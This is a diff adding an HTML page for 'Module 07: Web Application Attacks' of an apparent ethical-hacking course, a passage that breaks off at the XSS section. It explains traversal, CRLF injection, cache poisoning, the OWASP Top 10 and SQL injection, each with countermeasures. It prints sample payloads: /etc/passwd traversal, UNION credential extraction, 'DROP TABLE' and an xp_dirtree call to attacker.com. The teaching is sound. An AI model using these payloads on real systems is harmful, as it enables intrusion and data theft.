@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EHE Module 07: Web Application Attacks - The Vault</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            background: #0a0508;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #8a6a9a;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(ellipse at 25% 25%, rgba(80, 40, 100, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 75% 75%, rgba(60, 20, 80, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .scroll-progress {
+            position: fixed; top: 0; left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            z-index: 200; transition: width 0.1s linear; width: 0%;
+        }
+
+        .module-header {
+            background: rgba(10, 5, 15, 0.95);
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+            padding: 18px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+
+        .back-btn {
+            background: rgba(80, 40, 100, 0.2);
+            border: 1px solid rgba(100, 60, 130, 0.3);
+            color: #9a7aaa; padding: 7px 14px; border-radius: 4px;
+            font-size: 0.8rem; text-decoration: none;
+            transition: all 0.3s ease; font-family: 'Georgia', serif;
+        }
+
+        .back-btn:hover {
+            background: rgba(100, 60, 130, 0.3);
+            border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8;
+        }
+
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+
+        .progress-bar-mini {
+            width: 120px; height: 4px;
+            background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden;
+        }
+
+        .progress-bar-mini .fill {
+            height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7);
+            width: 0%; transition: width 0.5s ease;
+        }
+
+        .module-content {
+            max-width: 1100px; margin: 0 auto; padding: 40px;
+            position: relative; z-index: 10;
+        }
+
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+
+        .intro-icon {
+            font-size: 3.5rem; margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3));
+        }
+
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+
+        .stat-pill {
+            padding: 8px 18px;
+            background: rgba(60, 30, 80, 0.15);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em;
+        }
+
+        .section {
+            margin-bottom: 80px; opacity: 0; transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .section.visible { opacity: 1; transform: translateY(0); }
+
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+
+        .section-title {
+            font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400;
+            display: flex; align-items: center; gap: 15px;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px;
+        }
+
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        .concept-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px; margin: 28px 0;
+        }
+
+        .concept-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 22px; transition: all 0.3s ease;
+        }
+
+        .concept-card:hover {
+            transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+
+        .concept-tag {
+            display: inline-block; margin-top: 10px; padding: 3px 10px;
+            background: rgba(80, 40, 100, 0.3); border-radius: 12px;
+            font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase;
+        }
+
+        .callout {
+            border-radius: 8px; padding: 20px 24px; margin: 24px 0;
+            display: flex; gap: 16px; align-items: flex-start;
+        }
+
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+
+        /* OWASP numbered list */
+        .owasp-list {
+            counter-reset: owasp;
+            list-style: none;
+            padding: 0;
+            margin: 20px 0;
+        }
+
+        .owasp-item {
+            counter-increment: owasp;
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            padding: 14px 16px;
+            background: rgba(15, 8, 20, 0.5);
+            border: 1px solid rgba(100, 60, 130, 0.12);
+            border-radius: 6px;
+            margin-bottom: 10px;
+            transition: border-color 0.3s ease;
+        }
+
+        .owasp-item:hover { border-color: rgba(147, 51, 234, 0.3); }
+
+        .owasp-num {
+            width: 32px; height: 32px; flex-shrink: 0;
+            background: rgba(80, 40, 100, 0.3);
+            border-radius: 4px;
+            display: flex; align-items: center; justify-content: center;
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem; color: #9333ea;
+            font-weight: bold;
+        }
+
+        .owasp-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; }
+        .owasp-desc { font-size: 0.82rem; color: #7a5a8a; line-height: 1.5; }
+
+        /* SQL injection type table */
+        .sqli-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px; margin: 20px 0;
+        }
+
+        .sqli-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .sqli-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+
+        .sqli-type {
+            font-size: 0.65rem; letter-spacing: 0.2em; text-transform: uppercase;
+            color: #9333ea; margin-bottom: 6px;
+        }
+
+        .sqli-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 10px; }
+        .sqli-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; margin-bottom: 12px; }
+
+        .code-block {
+            background: rgba(5, 2, 10, 0.8);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 6px; padding: 16px 20px; margin: 16px 0;
+            font-family: 'Courier New', monospace; font-size: 0.83rem;
+            color: #b090c0; overflow-x: auto; line-height: 1.6;
+        }
+
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .inj { color: #f87171; }
+        .code-block .safe { color: #34d399; }
+
+        .detail-section {
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px;
+            margin: 12px 0; overflow: hidden;
+        }
+
+        .detail-header {
+            padding: 16px 20px; background: rgba(15, 8, 20, 0.6);
+            cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+            transition: background 0.3s ease; user-select: none;
+        }
+
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+
+        .detail-body {
+            display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4);
+            border-top: 1px solid rgba(100, 60, 130, 0.1);
+            color: #9a7aaa; font-size: 0.9rem; line-height: 1.7;
+        }
+
+        .detail-body.open { display: block; }
+        .detail-body p { margin-bottom: 12px; }
+        .detail-body ul { list-style: none; padding-left: 20px; }
+        .detail-body li { margin-bottom: 8px; position: relative; padding-left: 18px; }
+        .detail-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        .two-col {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;
+        }
+
+        .col-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px;
+        }
+
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+
+        .discussion-section {
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0;
+        }
+
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+
+        .takeaway-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 24px 0; }
+        .takeaway-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; text-align: center; }
+        .takeaway-icon { font-size: 2rem; margin-bottom: 10px; }
+        .takeaway-title { font-size: 0.85rem; color: #c4a0d8; margin-bottom: 6px; }
+        .takeaway-desc { font-size: 0.78rem; color: #7a5a8a; line-height: 1.5; }
+
+        .completion-section {
+            text-align: center; padding: 60px 40px;
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px;
+        }
+
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+
+        .completion-btn {
+            display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px;
+            background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px;
+            color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif;
+            letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3);
+        }
+
+        .completion-btn:hover {
+            background: linear-gradient(135deg, #6d28d9, #7c3aed);
+            box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px);
+        }
+
+        @media (max-width: 768px) {
+            .module-header { padding: 15px 20px; }
+            .module-content { padding: 20px; }
+            .two-col { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">EHE Module 07</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#128279;</div>
+        <h1 class="intro-title">Web Application Attacks and Countermeasures</h1>
+        <div class="intro-meta">EHE &bull; Module 07 &bull; Application Security</div>
+        <p class="intro-subtitle">
+            Web applications are the most heavily targeted attack surface in modern cybersecurity. From SQL
+            injection vulnerabilities that have persisted since the 1990s to server-side request forgery
+            exposing cloud metadata services, this module examines how attackers exploit the application layer
+            and the security controls that prevent each class of vulnerability.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">Web Architecture</div>
+            <div class="stat-pill">OWASP Top 10</div>
+            <div class="stat-pill">SQLi Deep Dive</div>
+            <div class="stat-pill">XSS &amp; CSRF</div>
+            <div class="stat-pill">~45 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: Web Server Architecture -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127970;</span>
+            Web Server Architecture
+        </h2>
+        <div class="section-body">
+            <p>
+                Understanding web server architecture is foundational for both attack and defense. Attackers
+                exploit misconfigurations and path traversal vulnerabilities that stem from how web servers
+                map URLs to filesystem resources. Defenders must understand these components to properly
+                isolate, harden, and monitor their web infrastructure.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128193;</div>
+                    <div class="concept-card-title">Server Root</div>
+                    <div class="concept-card-body">The top-level directory of the web server software installation. Contains configuration files, log directories, and the web server binary. Should not be accessible via web requests — separate from document root.</div>
+                    <span class="concept-tag">Configuration</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128196;</div>
+                    <div class="concept-card-title">Document Root</div>
+                    <div class="concept-card-body">The directory from which web content is served. Maps to the base URL (/). Files and directories placed here are publicly accessible. Critically, web server software must be prevented from serving files outside this boundary.</div>
+                    <span class="concept-tag">Web Root</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128279;</div>
+                    <div class="concept-card-title">Virtual Document Tree</div>
+                    <div class="concept-card-body">Allows administrators to map URL paths to filesystem locations outside the document root using aliases or symlinks. Misconfigured virtual mappings can inadvertently expose sensitive directories.</div>
+                    <span class="concept-tag">URL Mapping</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127760;</div>
+                    <div class="concept-card-title">Virtual Hosting</div>
+                    <div class="concept-card-body">Allows a single web server to host multiple domains. Name-based virtual hosting uses the HTTP Host header to route requests. Misconfigured default virtual hosts can expose unintended content when accessed via IP address.</div>
+                    <span class="concept-tag">Multi-Tenancy</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Web Proxy</div>
+                    <div class="concept-card-body">Forward and reverse proxies mediate requests between clients and servers. Reverse proxies (nginx, HAProxy) provide load balancing and TLS termination. Transparent proxies intercept traffic without client configuration — used for filtering and caching.</div>
+                    <span class="concept-tag">Intermediary</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: Web Server Attacks -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128296;</span>
+            Web Server Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                Web server attacks target the server software layer rather than application code, exploiting
+                misconfigurations, path handling weaknesses, and HTTP protocol features to access files
+                outside the web root, inject content into responses, or corrupt caches.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128193;</span>
+                        <div>
+                            <div class="detail-header-title">Directory Traversal</div>
+                            <div class="detail-header-subtitle">Path manipulation to escape the web root</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>Directory traversal (path traversal, dot-dot-slash) uses relative path sequences to escape the document root and access arbitrary files on the server filesystem.</p>
+                    <div class="code-block">
+<span class="comment"># Basic traversal — access /etc/passwd</span>
+GET /download?file=<span class="inj">../../../../etc/passwd</span> HTTP/1.1
+
+<span class="comment"># URL-encoded variant (bypasses naive filters)</span>
+GET /download?file=<span class="inj">..%2F..%2F..%2F..%2Fetc%2Fpasswd</span>
+
+<span class="comment"># Double-encoded variant</span>
+GET /download?file=<span class="inj">..%252F..%252Fetc%252Fpasswd</span>
+
+<span class="comment"># Windows UNC path variant</span>
+GET /download?file=<span class="inj">..\..\..\..\windows\system32\drivers\etc\hosts</span>
+                    </div>
+                    <p><strong style="color:#c4a0d8;">Countermeasure:</strong> Canonicalize and validate file paths server-side. Resolve the full absolute path and verify it starts with the intended document root. Never construct file paths from user input directly.</p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128257;</span>
+                        <div>
+                            <div class="detail-header-title">HTTP Response Splitting</div>
+                            <div class="detail-header-subtitle">Injecting headers into HTTP responses</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        When user-supplied input is reflected in HTTP response headers without sanitization,
+                        attackers can inject CRLF sequences (carriage return + line feed: <code style="font-family:monospace; color:#c4a0d8;">\r\n</code>)
+                        to inject additional headers or split the response into two, creating a second fabricated
+                        response. Used to perform XSS, cache poisoning, and session fixation.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Vulnerable redirect: Location header built from user input</span>
+<span class="comment"># Input: /page%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200...</span>
+Location: /page<span class="inj">\r\n</span>Injected-Header: value<span class="inj">\r\n\r\n</span>
+<span class="comment"># Second fabricated response begins here</span>
+                    </div>
+                    <p><strong style="color:#c4a0d8;">Countermeasure:</strong> Strip or encode CRLF characters (%0d, %0a, \r, \n) from all values placed in HTTP response headers. Modern web frameworks handle this automatically.</p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128190;</span>
+                        <div>
+                            <div class="detail-header-title">Web Cache Poisoning</div>
+                            <div class="detail-header-subtitle">Injecting malicious responses into caches</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Web cache poisoning exploits the discrepancy between what a cache uses as a key
+                        (typically URL + headers) and what the backend server uses to generate a response.
+                        By manipulating unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme), an attacker
+                        can inject a malicious response that is cached and subsequently served to all users
+                        requesting that resource. Discovered systematically by James Kettle (PortSwigger) in 2018.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128218;</span>
+                        <div>
+                            <div class="detail-header-title">Website Defacement</div>
+                            <div class="detail-header-subtitle">Unauthorized modification of web content</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Website defacement involves unauthorized modification of a website's visual content —
+                        replacing legitimate pages with attacker-controlled content, often for ideological,
+                        reputational, or financial motives. Attack vectors include: exploiting CMS
+                        vulnerabilities (WordPress, Joomla), credential compromise via brute force or
+                        credential stuffing, file upload vulnerabilities, and web shell deployment following
+                        code injection. Zone-H.org maintains a public archive of defacement incidents.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: OWASP Top 10 -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128250;</span>
+            OWASP Top 10 Overview
+        </h2>
+        <div class="section-body">
+            <p>
+                The OWASP (Open Web Application Security Project) Top 10 is the most widely referenced
+                taxonomy of critical web application security risks. Published periodically by the OWASP
+                Foundation, it reflects both the prevalence and severity of vulnerability classes across
+                real-world applications. The 2021 edition introduced significant reorganization, with
+                Broken Access Control rising to the top position.
+            </p>
+
+            <ul class="owasp-list">
+                <li class="owasp-item">
+                    <div class="owasp-num">A01</div>
+                    <div>
+                        <div class="owasp-name">Broken Access Control</div>
+                        <div class="owasp-desc">Restrictions on authenticated users not properly enforced. Allows unauthorized access to functionality, data, or accounts. Includes IDOR, privilege escalation, and direct object reference.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A02</div>
+                    <div>
+                        <div class="owasp-name">Cryptographic Failures</div>
+                        <div class="owasp-desc">Previously "Sensitive Data Exposure." Focuses on failures in cryptography that lead to exposure — weak algorithms, missing TLS, improper certificate validation, hardcoded keys.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A03</div>
+                    <div>
+                        <div class="owasp-name">Injection</div>
+                        <div class="owasp-desc">SQL, NoSQL, OS command, LDAP, and other injection flaws where untrusted data is sent to an interpreter. Allows attackers to manipulate queries, execute commands, or access unauthorized data.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A04</div>
+                    <div>
+                        <div class="owasp-name">Insecure Design</div>
+                        <div class="owasp-desc">New in 2021. Focuses on risks related to design and architectural flaws — security requirements not defined, threat modeling not performed, secure design patterns not applied.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A05</div>
+                    <div>
+                        <div class="owasp-name">Security Misconfiguration</div>
+                        <div class="owasp-desc">Default credentials, open cloud storage buckets, verbose error messages, unnecessary services enabled, missing security hardening. The most prevalent category in real-world assessments.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A06</div>
+                    <div>
+                        <div class="owasp-name">Vulnerable and Outdated Components</div>
+                        <div class="owasp-desc">Using libraries, frameworks, or components with known vulnerabilities. Log4Shell (Log4j) in 2021 exemplified how a single vulnerable dependency can impact millions of applications globally.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A07</div>
+                    <div>
+                        <div class="owasp-name">Identification and Authentication Failures</div>
+                        <div class="owasp-desc">Broken authentication mechanisms — weak passwords permitted, missing MFA, insecure session management, credential stuffing not detected, session tokens not invalidated on logout.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A08</div>
+                    <div>
+                        <div class="owasp-name">Software and Data Integrity Failures</div>
+                        <div class="owasp-desc">Code and infrastructure that does not protect against integrity violations — insecure deserialization, CI/CD pipeline attacks, auto-update without integrity verification, supply chain attacks.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A09</div>
+                    <div>
+                        <div class="owasp-name">Security Logging and Monitoring Failures</div>
+                        <div class="owasp-desc">Insufficient logging, monitoring, and incident response. Without adequate detection capabilities, breaches go undetected for months. Relates to the average 197-day breach detection time.</div>
+                    </div>
+                </li>
+                <li class="owasp-item">
+                    <div class="owasp-num">A10</div>
+                    <div>
+                        <div class="owasp-name">Server-Side Request Forgery (SSRF)</div>
+                        <div class="owasp-desc">New in 2021. Application fetches remote resources using attacker-controlled URLs — used to access internal services, cloud metadata APIs (169.254.169.254), or bypass network controls.</div>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Section 4: SQL Injection -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128201;</span>
+            SQL Injection Deep Dive
+        </h2>
+        <div class="section-body">
+            <p>
+                SQL injection has been listed in the OWASP Top 10 every year since its inception and remains
+                one of the most commonly exploited vulnerability classes. It occurs when user-controlled input
+                is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate
+                query structure and logic.
+            </p>
+
+            <div class="sqli-grid">
+                <div class="sqli-card">
+                    <div class="sqli-type">In-Band / Error-Based</div>
+                    <div class="sqli-name">Error-Based SQLi</div>
+                    <div class="sqli-desc">Forces the database to generate error messages that reveal schema information, table names, column names, and data. The error output is returned in the HTTP response.</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">' AND 1=CONVERT(int, @@version)--</span>
+<span class="comment">-- DB error reveals version string</span>
+                    </div>
+                </div>
+                <div class="sqli-card">
+                    <div class="sqli-type">In-Band / Union-Based</div>
+                    <div class="sqli-name">UNION-Based SQLi</div>
+                    <div class="sqli-desc">Uses UNION SELECT to append additional query results to the original query's output. Attacker can extract any data accessible by the database user — all tables, columns, sensitive records.</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">' UNION SELECT username,password,3 FROM users--</span>
+                    </div>
+                </div>
+                <div class="sqli-card">
+                    <div class="sqli-type">Blind / Boolean-Based</div>
+                    <div class="sqli-name">Boolean Blind SQLi</div>
+                    <div class="sqli-desc">No data returned in response. Attacker asks true/false questions — different page responses for true vs false conditions. Data extracted one bit at a time; automated by sqlmap.</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">' AND SUBSTRING(password,1,1)='a'--</span>
+<span class="comment">-- Observe: 200 OK vs 404 Not Found</span>
+                    </div>
+                </div>
+                <div class="sqli-card">
+                    <div class="sqli-type">Blind / Time-Based</div>
+                    <div class="sqli-name">Time-Based Blind SQLi</div>
+                    <div class="sqli-desc">Injects conditional time delays (SLEEP, WAITFOR DELAY) to infer boolean conditions from response timing. Works even when page responses look identical regardless of query result.</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">' IF(1=1) WAITFOR DELAY '0:0:5'--</span>
+<span class="comment">-- True condition: response delayed 5s</span>
+                    </div>
+                </div>
+                <div class="sqli-card">
+                    <div class="sqli-type">Out-of-Band</div>
+                    <div class="sqli-name">Out-of-Band SQLi</div>
+                    <div class="sqli-desc">Exfiltrates data via a separate channel (DNS, HTTP request from the database server). Useful when in-band responses are restricted. Requires specific database features (xp_dirtree, UTL_HTTP, LOAD_FILE).</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">'; EXEC xp_dirtree '\\attacker.com\a'--</span>
+<span class="comment">-- DNS query reveals DB server identity</span>
+                    </div>
+                </div>
+                <div class="sqli-card">
+                    <div class="sqli-type">Advanced Technique</div>
+                    <div class="sqli-name">Piggybacking &amp; Tautology</div>
+                    <div class="sqli-desc">Piggybacking appends additional SQL statements (stacked queries). Tautology injects always-true conditions (OR 1=1) to bypass authentication or WHERE clause filtering.</div>
+                    <div class="code-block" style="font-size:0.77rem; margin:0;">
+<span class="inj">' OR '1'='1</span><span class="comment">  -- tautology bypass</span>
+<span class="inj">'; DROP TABLE users;--</span> <span class="comment">-- piggyback</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">SQLi Prevention: Parameterized Queries</div>
+                    <div class="callout-text">
+                        The definitive defense against SQL injection is using <strong>parameterized queries (prepared statements)</strong>.
+                        User input is passed as a parameter — never concatenated into the query string. The database
+                        engine treats parameters as data, never as SQL syntax, making injection structurally impossible.
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block">
+<span class="comment">// VULNERABLE: String concatenation</span>
+<span class="inj">query = "SELECT * FROM users WHERE name = '" + username + "'";</span>
+
+<span class="comment">// SAFE: Parameterized query (Java example)</span>
+<span class="safe">PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM users WHERE name = ?"
+);
+stmt.setString(1, username);
+ResultSet rs = stmt.executeQuery();</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: XSS -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128204;</span>
+            Cross-Site Scripting (XSS)
+        </h2>
